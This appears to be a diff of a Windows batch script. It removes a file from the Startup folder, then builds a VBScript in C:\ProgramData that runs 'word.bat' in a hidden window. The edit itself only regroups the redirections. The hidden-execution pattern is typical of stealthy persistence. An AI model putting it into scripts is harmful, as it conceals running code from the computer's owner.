@@ -9,12 +9,14 @@ timeout 0 >> nul
 set errorlevel=errorlevel
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
 echo Set WinScriptHost = CreateObject("WScript.Shell")>> "C:\ProgramData\world.vbs"
-set /p "=WinScriptHost.Run " <nul >> "C:\ProgramData\world.vbs"
-set /p "=Chr(34) " <nul >> "C:\ProgramData\world.vbs"
-set /p "=& " <nul >> "C:\ProgramData\world.vbs"
-set /p "=""C:\ProgramData\word.bat" " " <nul >> "C:\ProgramData\world.vbs"
-set /p "=& " <nul >> "C:\ProgramData\world.vbs"
-set /p "=Chr(34), 0" <nul >> "C:\ProgramData\world.vbs"
+>>"C:\ProgramData\world.vbs" (
+    set /p "=WinScriptHost.Run " <nul
+    set /p "=Chr(34) " <nul
+    set /p "=& " <nul
+    set /p "=""C:\ProgramData\word.bat" " " <nul
+    set /p "=& " <nul
+    set /p "=Chr(34), 0" <nul
+)
 echo.>> "C:\ProgramData\world.vbs"
 echo Set WinScriptHost = Nothing>> "C:\ProgramData\world.vbs"
 echo @echo off>> "C:\ProgramData\word.bat"
